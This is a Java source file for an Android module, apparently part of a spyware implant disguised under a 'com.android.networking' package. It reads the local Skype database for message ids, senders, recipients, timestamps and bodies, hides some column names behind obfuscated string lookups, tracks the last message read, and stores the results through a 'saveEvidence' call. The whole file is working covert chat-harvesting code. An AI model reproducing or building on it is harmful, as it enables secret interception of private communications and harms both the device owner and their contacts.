package com.android.networking.module.chat;

import java.util.ArrayList;
import java.util.Date;

import android.database.Cursor;

import com.android.networking.Messages;
import com.android.networking.db.RecordVisitor;
import com.android.networking.util.StringUtils;

public class SkypeVisitor extends RecordVisitor {

	private ChatSkype chatSkype;
	public long lastId;
	// k_8=id
	// k_9=author
	// k_10=dialog_partner
	// k_11=body_xml

	// from_dispname
	private String[] projection = { Messages.getString("k_8"), "timestamp", Messages.getString("k_9"), "from_dispname",
			Messages.getString("k_10"), Messages.getString("k_11") };
	private String selection = " id > ";

	ArrayList<MessageChat> messages;
	private String account;

	public SkypeVisitor(ChatSkype chatSkype, String account) {
		super();
		this.chatSkype = chatSkype;
		this.account = account;
	}

	@Override
	public long cursor(Cursor cursor) {
		int id = cursor.getInt(0);
		Date timestamp = new Date(cursor.getLong(1) * 1000);
		String from = cursor.getString(2);
		String fromDisplay = cursor.getString(3);
		String to = cursor.getString(4);
		String toDisplay = to;
		String body = cursor.getString(5);

		boolean incoming = !account.equals(from);

		if (!StringUtils.isEmpty(body)) {
			MessageChat message = new MessageChat(chatSkype.getProgramId(), timestamp, from, fromDisplay, to,
					toDisplay, body, incoming);

			messages.add(message);
		}
		return timestamp.getTime();
	}

	@Override
	public void init() {
		messages = new ArrayList<MessageChat>();
	};

	@Override
	public void close() {
		if (messages != null && messages.size() > 0) {
			chatSkype.saveEvidence(messages);
		}
	};

	@Override
	public String[] getProjection() {
		return projection;
	}

	@Override
	public String getSelection() {
		String where = selection + lastId;

		return where;
	}
}
